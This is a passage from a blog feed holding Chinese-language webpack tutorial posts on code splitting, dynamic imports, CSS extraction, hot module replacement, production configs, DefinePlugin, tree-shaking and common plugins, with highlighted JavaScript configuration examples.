punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">new</span> <span class="token class-name">HtmlWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      title<span class="token punctuation">:</span> <span class="token string">'Multi Entry'</span><span class="token punctuation">,</span>      template<span class="token punctuation">:</span> <span class="token string">'./src/album.html'</span><span class="token punctuation">,</span>      filename<span class="token punctuation">:</span> <span class="token string">'album.html'</span><span class="token punctuation">,</span>      chunks<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'album'</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">// album.html 只会引入打包后的 album.js</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h3 id="动态导入"><a href="#动态导入" class="headerlink" title="动态导入"></a>动态导入</h3><blockquote><p>需要某个模块时再去加载，动态导入的模块会被自动分包</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// import posts from './posts/posts'</span><span class="token comment" spellcheck="true">// import album from './album/album'</span><span class="token comment" spellcheck="true">// 删除固定导入</span><span class="token keyword">const</span> render <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> hash <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash <span class="token operator">||</span> <span class="token string">'#posts'</span>  <span class="token keyword">const</span> mainElement <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.main'</span><span class="token punctuation">)</span>  mainElement<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">''</span>  <span class="token comment" spellcheck="true">// 根据 hash 值动态导入</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>hash <span class="token operator">===</span> <span class="token string">'#posts'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 魔法注释添加文件名</span>    <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token comment" spellcheck="true">/* webpackChunkName: 'components' */</span><span class="token string">'./posts/posts'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token keyword">default</span><span class="token punctuation">:</span> posts <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>          mainElement<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span><span class="token function">posts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>hash <span class="token operator">===</span> <span class="token string">'#album'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 魔法注释添加文件名</span>    <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token comment" spellcheck="true">/* webpackChunkName: 'components' */</span><span class="token string">'./album/album'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token keyword">default</span><span class="token punctuation">:</span> album <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      mainElement<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span><span class="token function">album</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'hashchange'</span><span class="token punctuation">,</span> render<span class="token punctuation">)</span></code></pre><h2 id="mini-css-extract-plugin"><a href="#mini-css-extract-plugin" class="headerlink" title="mini-css-extract-plugin"></a>mini-css-extract-plugin</h2><blockquote><p>mini-css-extract-plugin将css单独提取出来，如果 css 超过 150KB 时需要单独提取</p><p>提取出来后还需要用OptimizeCssAssetsWebpackPlugin进行压缩</p><p>因为 webpack 内置的压缩插件只打包 js 文件</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> MiniCssExtractPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'mini-css-extract-plugin'</span><span class="token punctuation">)</span><span class="token keyword">const</span> OptimizeCssAssetsWebpackPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'optimize-css-assets-webpack-plugin'</span><span class="token punctuation">)</span><span class="token keyword">const</span> TerserWebpackPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'terser-webpack-plugin'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  mode<span class="token punctuation">:</span> <span class="token string">'none'</span><span class="token punctuation">,</span>  entry<span class="token punctuation">:</span> <span class="token punctuation">{</span>    main<span class="token punctuation">:</span> <span class="token string">'./src/index.js'</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  optimization<span class="token punctuation">:</span> <span class="token punctuation">{</span>    minimizer<span class="token punctuation">:</span> <span class="token punctuation">[</span>      <span class="token keyword">new</span> <span class="token class-name">TerserWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token keyword">new</span> <span class="token class-name">OptimizeCssAssetsWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  module<span class="token punctuation">:</span> <span class="token punctuation">{</span>    rules<span class="token punctuation">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token regex">/\.css$/</span><span class="token punctuation">,</span>        use<span class="token punctuation">:</span> <span class="token punctuation">[</span>          <span class="token comment" spellcheck="true">// 'style-loader', // 将样式通过 style 标签注入</span>          MiniCssExtractPlugin<span class="token punctuation">.</span>loader<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 直接通过 link 方式引入</span>          <span class="token string">'css-loader'</span>        <span class="token punctuation">]</span>      <span class="token punctuation">}</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token keyword">new</span> <span class="token class-name">MiniCssExtractPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><blockquote><p>为什么ptimizeCssAssetsWebpackPlugin插件放在这不放在 plugins 数组中呢 ?</p><p>因为放在 plugins 说明在任何时候都会加载这个插件，而我们放到 minimizer 中，只会在生产环境开启 minimizer 时工作</p><p>但是这时会发现 js 没有压缩，因为我们设置了minimizer，webpack会认为我们自定义了压缩插件，所以我们还要添加回去压缩 js 的插件TerserWebpackPlugin。</p></blockquote><h2 id="文件名-Hash"><a href="#文件名-Hash" class="headerlink" title="文件名 Hash"></a>文件名 Hash</h2><pre class=" language-js"><code class="language-js">  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token keyword">new</span> <span class="token class-name">CleanWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">new</span> <span class="token class-name">HtmlWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      title<span class="token punctuation">:</span> <span class="token string">'Dynamic import'</span><span class="token punctuation">,</span>      template<span class="token punctuation">:</span> <span class="token string">'./src/index.html'</span><span class="token punctuation">,</span>      filename<span class="token punctuation">:</span> <span class="token string">'index.html'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">new</span> <span class="token class-name">MiniCssExtractPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      filename<span class="token punctuation">:</span> <span class="token string">'[name]-[contenthash:8].bundle.css'</span> <span class="token comment" spellcheck="true">// 文件级别的hash</span>      <span class="token comment" spellcheck="true">// filename: '[name]-[chunkhash].bundle.css'  // chunk级别</span>      <span class="token comment" spellcheck="true">// filename: '[name]-[hash].bundle.css'       // 项目级别，一个文件改变，所有hash全部改变</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> webpack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webpack（三）</title>
      <link href="2020/09/07/webpack-webpack%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>2020/09/07/webpack-webpack%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>HMR</li><li>生产环境优化</li><li>DefinePlugin</li><li>Tree-shaking</li><li>sideEffects</li></ul><h2 id="HMR"><a href="#HMR" class="headerlink" title="HMR"></a>HMR</h2><p>原理参考：<a href="https://juejin.im/post/6844904008432222215" target="_blank" rel="noopener">轻松理解webpack热更新原理</a></p><p>如果在页面中存在一个可输入文本框，在其中输入文字后，改变文本框样式后会发现页面刷新，文字丢失</p><p>那么如何在页面不刷新的前提下，模块也可以及时更新。</p><blockquote><p>HMR：Hot Module Replacement 模块热更新</p><p>应用程序运行过程中实时替换某个模块，页面状态不会改变</p></blockquote><p>运行命令：<code>webpack-dev-server --hot</code></p><p>或者配置<code>webpack.config.js</code></p><pre class=" language-js"><code class="language-js">devServer<span class="token punctuation">:</span> <span class="token punctuation">{</span>    hot<span class="token punctuation">:</span> <span class="token boolean">true</span>    <span class="token comment" spellcheck="true">// hotOnly: true // 只使用 HMR，不会 fallback 到 live reloading，可以发现错误代码</span><span class="token punctuation">}</span><span class="token punctuation">,</span></code></pre><blockquote><p>此时会发现，修改源代码中的样式文件已经实现热更新，但是修改js文件还不能实现</p><p>因为样式文件在 style-loader 中已经处理过，直接覆盖就好，而 js 文件导出的对象不确定，webpack不知道怎么处理，并没有统一的处理方案。在Vue等框架中每种文件都是有规律的，所以不用手动写逻辑。</p><p>综上 HMR 需要手动处理模块热更新逻辑</p></blockquote><pre class=" language-js"><code class="language-js">module<span class="token punctuation">.</span>hot<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token string">'./editor.js'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">// 在这里写更新逻辑，则页面不会自动刷新</span>   <span class="token comment" spellcheck="true">// 如果没有此处的手动处理，页面还会自动刷新</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p> 以编辑器和图片热更新逻辑为例</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// ================================================================</span><span class="token comment" spellcheck="true">// HMR 手动处理模块热更新</span><span class="token comment" spellcheck="true">// 不用担心这些代码在生产环境冗余的问题，因为通过 webpack 打包后，</span><span class="token comment" spellcheck="true">// 这些代码全部会被移除，这些只是开发阶段用到</span><span class="token keyword">if</span> <span class="token punctuation">(</span>module<span class="token punctuation">.</span>hot<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> hotEditor <span class="token operator">=</span> editor  module<span class="token punctuation">.</span>hot<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token string">'./editor.js'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 当 editor.js 更新，自动执行此函数</span>    <span class="token comment" spellcheck="true">// 临时记录编辑器内容</span>    <span class="token keyword">const</span> value <span class="token operator">=</span> hotEditor<span class="token punctuation">.</span>innerHTML    <span class="token comment" spellcheck="true">// 移除更新前的元素</span>    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>hotEditor<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 创建新的编辑器</span>    <span class="token comment" spellcheck="true">// 此时 createEditor 已经是更新过后的函数了</span>    hotEditor <span class="token operator">=</span> <span class="token function">createEditor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 还原编辑器内容</span>    hotEditor<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> value    <span class="token comment" spellcheck="true">// 追加到页面</span>    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>hotEditor<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  module<span class="token punctuation">.</span>hot<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token string">'./better.png'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 当 better.png 更新后执行</span>    <span class="token comment" spellcheck="true">// 重写设置 src 会触发图片元素重新加载，从而局部更新图片</span>    img<span class="token punctuation">.</span>src <span class="token operator">=</span> background  <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h2 id="生产环境优化"><a href="#生产环境优化" class="headerlink" title="生产环境优化"></a>生产环境优化</h2><blockquote><p>模式 （mode）：为不同的工作环境创建不同的配置</p><ol><li>配置文件根据环境不同导出不同配置</li><li>一个环境对应一个配置文件</li></ol></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> webpack <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack'</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">{</span> CleanWebpackPlugin <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'clean-webpack-plugin'</span><span class="token punctuation">)</span><span class="token keyword">const</span> CopyWebpackPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'copy-webpack-plugin'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">(</span>env<span class="token punctuation">,</span> argv<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> config <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 正常配置</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>env <span class="token operator">===</span> <span class="token string">'production'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    config<span class="token punctuation">.</span>mode <span class="token operator">=</span> <span class="token string">'production'</span>    config<span class="token punctuation">.</span>devtool <span class="token operator">=</span> <span class="token boolean">false</span>    config<span class="token punctuation">.</span>plugins <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token operator">...</span>config<span class="token punctuation">.</span>plugins<span class="token punctuation">,</span>      <span class="token keyword">new</span> <span class="token class-name">CleanWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token keyword">new</span> <span class="token class-name">CopyWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'public'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 生产环境需要 copy 图片等</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> config<span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 此时在命令行中运行：webpack --env production</span></code></pre><p>若一个环境对应一个配置文件，则项目中需要有三个配置文件</p><ul><li>webpack.common.js：存放一些公共的配置</li><li>webpack.dev.js</li><li>webpack.prod.js</li></ul><p>此时还需要安装一个插件<code>webpack-merge</code>，实现在原有基础上添加插件</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> webpack <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack'</span><span class="token punctuation">)</span><span class="token keyword">const</span> merge <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack-merge'</span><span class="token punctuation">)</span><span class="token keyword">const</span> common <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./webpack.common'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token function">merge</span><span class="token punctuation">(</span>common<span class="token punctuation">,</span> <span class="token punctuation">{</span>  mode<span class="token punctuation">:</span> <span class="token string">'development'</span><span class="token punctuation">,</span>  devtool<span class="token punctuation">:</span> <span class="token string">'cheap-eval-module-source-map'</span><span class="token punctuation">,</span>  devServer<span class="token punctuation">:</span> <span class="token punctuation">{</span>    hot<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    contentBase<span class="token punctuation">:</span> <span class="token string">'public'</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token keyword">new</span> <span class="token class-name">webpack<span class="token punctuation">.</span>HotModuleReplacementPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>此时命令行则需要输入<code>webpack --config webpack.prod.js</code></p><h2 id="DefinePlugin"><a href="#DefinePlugin" class="headerlink" title="DefinePlugin"></a>DefinePlugin</h2><blockquote><p>为代码注入全局成员</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// webpack.config.js</span><span class="token keyword">const</span> webpack <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  mode<span class="token punctuation">:</span> <span class="token string">'none'</span><span class="token punctuation">,</span>  entry<span class="token punctuation">:</span> <span class="token string">'./src/main.js'</span><span class="token punctuation">,</span>  output<span class="token punctuation">:</span> <span class="token punctuation">{</span>    filename<span class="token punctuation">:</span> <span class="token string">'bundle.js'</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token keyword">new</span> <span class="token class-name">webpack<span class="token punctuation">.</span>DefinePlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// 值要求的是一个代码片段</span>      API_BASE_URL<span class="token punctuation">:</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token string">'https://api.example.com'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// main.js</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>API_BASE_URL<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 运行 webpack 打包后查看bundle.js,发现在最后添加了代码</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"https://api.example.com"</span><span class="token punctuation">)</span></code></pre><h2 id="Tree-shaking"><a href="#Tree-shaking" class="headerlink" title="Tree-shaking"></a>Tree-shaking</h2><p>摇掉那些未引用的代码，减小代码体积，在生产模式下会自动开启<code>webpack --mode production</code></p><p>不是生产环境需要手动配置，如下：</p><pre class=" language-js"><code class="language-js">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  mode<span class="token punctuation">:</span> <span class="token string">'none'</span><span class="token punctuation">,</span>  entry<span class="token punctuation">:</span> <span class="token string">'./src/index.js'</span><span class="token punctuation">,</span>  output<span class="token punctuation">:</span> <span class="token punctuation">{</span>    filename<span class="token punctuation">:</span> <span class="token string">'bundle.js'</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// 优化操作</span>  optimization<span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 负责标记枯树叶</span>    usedExports<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 负责摇掉枯树叶</span>    minimize<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 尽可能合并每一个模块到一个函数中,可以看到 bundle.js 模块数量减少了</span>    <span class="token comment" spellcheck="true">// concatenateModules: true,</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>举个例子</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// components.js</span><span class="token keyword">export</span> <span class="token keyword">const</span> Button <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'button'</span><span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'dead-code'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">const</span> Link <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">const</span> Heading <span class="token operator">=</span> level <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'h'</span> <span class="token operator">+</span> level<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// index.js,只有Button被使用</span><span class="token keyword">import</span> <span class="token punctuation">{</span> Button <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./components'</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span><span class="token function">Button</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 正常用 webpack 命令打包时，在 bundle.js 中搜不到 Link, Heading，console.log</span></code></pre><h4 id="问题：使用babel-loader后，Tree-shaking会失效？"><a href="#问题：使用babel-loader后，Tree-shaking会失效？" class="headerlink" title="问题：使用babel-loader后，Tree-shaking会失效？"></a>问题：使用<code>babel-loader</code>后，Tree-shaking会失效？</h4><ul><li>由webpack打包的代码必须使用ES Modules，先交给loader处理，然后再打包</li><li>而babel转换时，可能会将 ES Module 转换成 CommonJS ,就会失效，但是最新版的babel没问题</li></ul><pre class=" language-js"><code class="language-js">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  mode<span class="token punctuation">:</span> <span class="token string">'none'</span><span class="token punctuation">,</span>  entry<span class="token punctuation">:</span> <span class="token string">'./src/index.js'</span><span class="token punctuation">,</span>  output<span class="token punctuation">:</span> <span class="token punctuation">{</span>    filename<span class="token punctuation">:</span> <span class="token string">'bundle.js'</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  module<span class="token punctuation">:</span> <span class="token punctuation">{</span>    rules<span class="token punctuation">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token regex">/\.js$/</span><span class="token punctuation">,</span>        use<span class="token punctuation">:</span> <span class="token punctuation">{</span>          loader<span class="token punctuation">:</span> <span class="token string">'babel-loader'</span><span class="token punctuation">,</span>          options<span class="token punctuation">:</span> <span class="token punctuation">{</span>            presets<span class="token punctuation">:</span> <span class="token punctuation">[</span>              <span class="token comment" spellcheck="true">// 如果 Babel 加载模块时已经转换了 ESM，则会导致 Tree Shaking 失效</span>              <span class="token comment" spellcheck="true">// ['@babel/preset-env', { modules: 'commonjs' }]</span>              <span class="token comment" spellcheck="true">// 设置为false就不会开启转换</span>              <span class="token comment" spellcheck="true">// ['@babel/preset-env', { modules: false }]</span>              <span class="token comment" spellcheck="true">// 也可以使用默认配置，也就是 auto，这样 babel-loader 会自动关闭 ESM 转换</span>              <span class="token punctuation">[</span><span class="token string">'@babel/preset-env'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> modules<span class="token punctuation">:</span> <span class="token string">'auto'</span> <span class="token punctuation">}</span><span class="token punctuation">]</span>            <span class="token punctuation">]</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  optimization<span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 模块只导出被使用的成员</span>    usedExports<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 尽可能合并每一个模块到一个函数中</span>    <span class="token comment" spellcheck="true">// concatenateModules: true,</span>    <span class="token comment" spellcheck="true">// 压缩输出结果</span>    <span class="token comment" spellcheck="true">// minimize: true</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> webpack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webpack（二）</title>
      <link href="2020/09/06/webpack-webpack%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>2020/09/06/webpack-webpack%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>webpack插件机制</li><li>webpack dev server</li><li>Sourcemap</li></ul><h2 id="webpack插件机制"><a href="#webpack插件机制" class="headerlink" title="webpack插件机制"></a>webpack插件机制</h2><ul><li>Loader专注实现资源模块加载</li><li>Plugin解决其他自动化工作<ul><li>清除dist目录</li><li>拷贝静态文件至输出目录</li><li>压缩输出代码</li></ul></li></ul><p>webpack + plugin 基本实现了前端工程化</p><h3 id="clean-webpack-plugin"><a href="#clean-webpack-plugin" class="headerlink" title="clean-webpack-plugin"></a>clean-webpack-plugin</h3><blockquote><p>作用： 清除dist目录插件</p></blockquote><p><code>cnpmm install -D clean-webpack-plugin</code></p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// webpack.config.js</span><span class="token keyword">const</span> <span class="token punctuation">{</span> CleanWebpackPlugin <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'clean-webpack-plugin'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 新增</span>  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token keyword">new</span> <span class="token class-name">CleanWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h3 id="html-webpack-plugin"><a href="#html-webpack-plugin" class="headerlink" title="html-webpack-plugin"></a>html-webpack-plugin</h3><blockquote><p>作用：自动生成引用bundle.js的html文件</p></blockquote><p><code>cnpm install -D html-webpack-plugin</code></p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token keyword">const</span> HtmlWebpackPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'html-webpack-plugin'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  mode<span class="token punctuation">:</span> <span class="token string">'none'</span><span class="token punctuation">,</span>  entry<span class="token punctuation">:</span> <span class="token string">'./src/main.js'</span><span class="token punctuation">,</span>  output<span class="token punctuation">:</span> <span class="token punctuation">{</span>    filename<span class="token punctuation">:</span> <span class="token string">'bundle.js'</span><span class="token punctuation">,</span>    path<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'dist'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// publicPath: 'dist/'</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token keyword">new</span> <span class="token class-name">CleanWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 用于生成 index.html</span>    <span class="token keyword">new</span> <span class="token class-name">HtmlWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      title<span class="token punctuation">:</span> <span class="token string">'Webpack Plugin Sample'</span><span class="token punctuation">,</span>      meta<span class="token punctuation">:</span> <span class="token punctuation">{</span>        viewport<span class="token punctuation">:</span> <span class="token string">'width=device-width'</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      template<span class="token punctuation">:</span> <span class="token string">'./src/index.html'</span> <span class="token comment" spellcheck="true">// 模板</span>    <span class="token punctuation">}</span><span class="token 